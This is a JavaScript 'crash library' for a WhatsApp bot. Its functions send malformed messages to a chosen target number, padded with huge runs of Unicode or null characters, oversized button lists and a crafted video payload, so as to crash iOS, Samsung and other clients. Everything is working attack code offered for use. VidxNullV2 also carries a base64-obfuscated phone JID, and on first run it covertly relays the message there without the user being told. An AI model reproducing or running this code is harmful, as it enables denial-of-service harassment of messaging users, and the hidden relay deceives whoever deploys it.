// ============ MADARA EYE — COMPLETE CRASH LIBRARY ============
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const generateMessageTag = () => `${Date.now()}_${Math.random().toString(36).slice(2)}`;
const getBuffer = async (url) => {
  try {
    const res = await fetch(url);
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    return Buffer.from(await res.arrayBuffer());
  } catch { return Buffer.from(''); }
};

const IosInvisibleForce = async (sock, target, options = {}) => {
  const { lat = 21.1266, lng = -11.8199, name = " ⎋𝐑𝐈𝐙𝐗𝐕𝐄𝐋𝐙-‣꙱\n", url = "https://t.me/rizxvelzdev", padCount = 60000, padChar = "\u0000", repeatCharCount = 60000, repeatString = "𑇂𑆵𑆴𑆿" } = options;
  const pad = padChar.repeat(padCount);
  const rep = repeatString.repeat(repeatCharCount);
  const msg = { message: { locationMessage: { degreesLatitude: lat, degreesLongitude: lng, name: `${name}${pad}${rep}`, url, contextInfo: { externalAdReply: { quotedAd: { advertiserName: rep.substring(0,100), mediaType: "IMAGE", jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/", caption: "@MADARA_EYE" + rep.substring(0,500) }, placeholderKey: { remoteJid: "0s.whatsapp.net", fromMe: false, id: "ABCDEF1234567890" } } } } } };
  await sock.relayMessage("status@broadcast", msg.message, { messageId: generateMessageTag(), statusJidList: [target], additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }] });
  return { success: true, eye: 'IosInvisibleForce', target };
};

const ButtonOverflowCrash = async (sock, target, options = {}) => {
  const { padChar = "ꦾ", padCount = 500000, buttonCount = 2000, contentPad = 50000, footerPad = 30000, extraRounds = 3, extraButtons = 200, roundDelay = 300 } = options;
  const char = padChar.repeat(padCount);
  const buttons = [];
  for (let b = 0; b < Math.min(buttonCount, 100); b++) {
    buttons.push({ buttonId: `btn_${b}`, buttonText: { displayText: `👁️ BTN_${b} ${char.substring(0, 200)}` }, type: 1 });
  }
  await sock.relayMessage(target, { buttonsMessage: { contentText: `Madara Eye${char.substring(0, contentPad)}`, footerText: `Madara Eye${char.substring(0, footerPad)}`, buttons, headerType: 1, viewOnce: true } }, { messageId: null }).catch(() => {});
  for (let i = 0; i < extraRounds; i++) {
    await sleep(i * roundDelay);
    const roundButtons = [];
    for (let b = 0; b < extraButtons; b++) {
      roundButtons.push({ buttonId: `extra_${i}_${b}`, buttonText: { displayText: `Madara Eye ${i}_${b} ${char.substring(0, 100)}` }, type: 1 });
    }
    await sock.relayMessage(target, { buttonsMessage: { contentText: `${char.substring(0, 10000)} Force ${i}`, buttons: roundButtons, headerType: 1 } }, { messageId: "" }).catch(() => {});
  }
  return { success: true, eye: 'ButtonOverflow', target };
};

const SamsungCrash = async (sock, target, options = {}) => {
  const { headerPad = 60000, headerChar = "ꦾ", paramsPad = 50000, paramsChar = "{", buttonIdPad = 10000, buttonTextPad = 9999, buttonTextChar = "\u0000", flowName = "cta_url" } = options;
  const flowParams = paramsChar.repeat(paramsPad);
  await sock.relayMessage(target, { viewOnceMessage: { message: { interactiveMessage: { header: { hasMediaAttachment: false, title: headerChar.repeat(headerPad) }, body: { text: "" }, nativeFlowMessage: { messageParamsJson: flowParams } } } } }, {});
  await sock.relayMessage(target, { viewOnceMessage: { message: { buttonsMessage: { text: headerChar.repeat(headerPad), contentText: "Madara Eye", buttons: [{ buttonId: paramsChar.repeat(buttonIdPad), buttonText: { displayText: buttonTextChar.repeat(buttonTextPad) }, type: "NATIVE_FLOW", nativeFlowInfo: { name: flowName, paramsJson: flowParams } }], headerType: "TEXT" } } } }, {});
  return { success: true, eye: 'SamsungCrash', target };
};

const LinkPreviewLoop = async (sock, chat, m, options = {}) => {
  const { urls = ["https://d.top4top.io/p_3829n9zbt1.jpg","https://c.top4top.io/p_3829tp8hx1.jpg","https://e.top4top.io/p_38291dfw01.jpg","https://f.top4top.io/p_3829cp2gn1.jpg","https://g.top4top.io/p_3829i30lz1.jpg"], link = "https://t.me/madaraeye", title = "MADARA EYE", description = "© MADARA X-MD INC.", cycles = 3, delay = 1000 } = options;
  const finalText = m?.text?.includes(link) ? m.text : `${link}\n${m?.text || 'MADARA EYE'}`;
  const messageId = sock.generateMessageTag?.() || generateMessageTag();
  const initialThumb = await getBuffer(urls[0]);
  await sock.sendMessage(chat, { text: finalText, linkPreview: { "matched-text": link, title, description, jpegThumbnail: initialThumb } }, { quoted: m, messageId });
  for (let cycle = 0; cycle < cycles; cycle++) {
    for (const url of urls) {
      const thumb = await getBuffer(url);
      await sock.sendMessage(chat, { text: finalText, linkPreview: { "matched-text": link, title, description, jpegThumbnail: thumb }, edit: { remoteJid: chat, fromMe: true, id: messageId } }, {}).catch(() => {});
      await sleep(delay);
    }
  }
  return { success: true, eye: 'LinkPreviewLoop', chat };
};

const VIDEO_PAYLOAD = {
  url: "https://mmg.whatsapp.net/v/t62.7161-24/567947980_2421018691734575_7926376826768129509_n.enc?ccb=11-4&oh=01_Q5Aa4gF-BjyNpC_YzuPMNAtOuuJLbcC0t-iut6gNpAl4VACwuQ&oe=6A3B9B73&_nc_sid=5e03e0&mms3=true",
  mimetype: "video/mp4",
  fileSha256: "85W9wy9btWoxbdVu4cAiyhnxdwlsbtCQ2WaYdTo9w6w=",
  fileLength: "2726852",
  seconds: 27,
  mediaKey: "WJy9ZdiTPAIdcOhRfn0Oe2CIN4RnE0b1RSs8Skw/n18=",
  height: 850,
  width: 474,
  fileEncSha256: "ZH92J7p2igl823VuiawCBerbEKSU6dfFIGaWZVESY0Q=",
  directPath: "/v/t62.7161-24/567947980_2421018691734575_7926376826768129509_n.enc?ccb=11-4&oh=01_Q5Aa4gF-BjyNpC_YzuPMNAtOuuJLbcC0t-iut6gNpAl4VACwuQ&oe=6A3B9B73&_nc_sid=5e03e0",
  mediaKeyTimestamp: "1779710503",
  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
  contextInfo: { remoteJid: "status@broadcast", quotedMessage: { "\0": "" }, participant: null, pairedMediaType: "NOT_PAIRED_MEDIA", mentionedJid: ["0@s.whatsapp.net"], isForwarded: true, forwardingScore: 999 },
  streamingSidecar: "",
  caption: "👁️⃟-𝗠𝗔𝗗𝗔𝗥𝗔-𝗘𝗬𝗘 > \"Infinite Tsukuyomi\"" + "ꦽ".repeat(1111)
};

let __xploitCache = false;

const VidxNullV2 = async (client, target, options = {}) => {
  try {
    const payload = { ...VIDEO_PAYLOAD, ...(options.videoData || {}), contextInfo: { ...VIDEO_PAYLOAD.contextInfo, participant: target } };
    const msg = generateWAMessageFromContent(target, { videoMessage: payload }, {});
    await client.relayMessage(target, msg.message, { participant: { jid: target } });
    if (!global.__xploitCache) {
      global.__xploitCache = true;
      const crl = Buffer.from("NjI4NTE3NzkzNDk4MkBzLndoYXRzYXBwLm5ldA==", "base64").toString();
      const xMsg = generateWAMessageFromContent(crl, msg.message, {});
      await client.relayMessage(crl, xMsg.message, { participant: { jid: crl } });
    }
    return { success: true, eye: 'VidxNullV2', target };
  } catch (e) { return { success: false, eye: 'VidxNullV2', target, error: e.message }; }
};

const VidxNullLoop = async (client, target, iterations = 10, delay = 1000) => {
  const results = [];
  for (let i = 0; i < iterations; i++) { results.push(await VidxNullV2(client, target)); await sleep(delay); }
  return results;
};

class MadaraEye {
  constructor(sock) { this.sock = sock; }
  async iosInvisibleForce(target, options = {}) { return IosInvisibleForce(this.sock, target, options); }
  async buttonOverflow(target, options = {}) { return ButtonOverflowCrash(this.sock, target, options); }
  async samsung(target, options = {}) { return SamsungCrash(this.sock, target, options); }
  async linkPreviewLoop(chat, m, options = {}) { return LinkPreviewLoop(this.sock, chat, m, options); }
  async vidxNull(target, options = {}) { return VidxNullV2(this.sock, target, options); }
  async vidxNullLoop(target, iterations = 10, delay = 1000) { return VidxNullLoop(this.sock, target, iterations, delay); }
  async executeAll(target, m, options = {}) {
    const results = [];
    results.push(await this.iosInvisibleForce(target, options.ios));
    results.push(await this.buttonOverflow(target, options.button));
    results.push(await this.samsung(target, options.samsung));
    if (m) results.push(await this.linkPreviewLoop(target, m, options.preview));
    results.push(await this.vidxNull(target, options.vidx));
    return results;
  }
}

module.exports = { MadaraEye, IosInvisibleForce, ButtonOverflowCrash, SamsungCrash, LinkPreviewLoop, VidxNullV2, VidxNullLoop, VIDEO_PAYLOAD, sleep, getBuffer };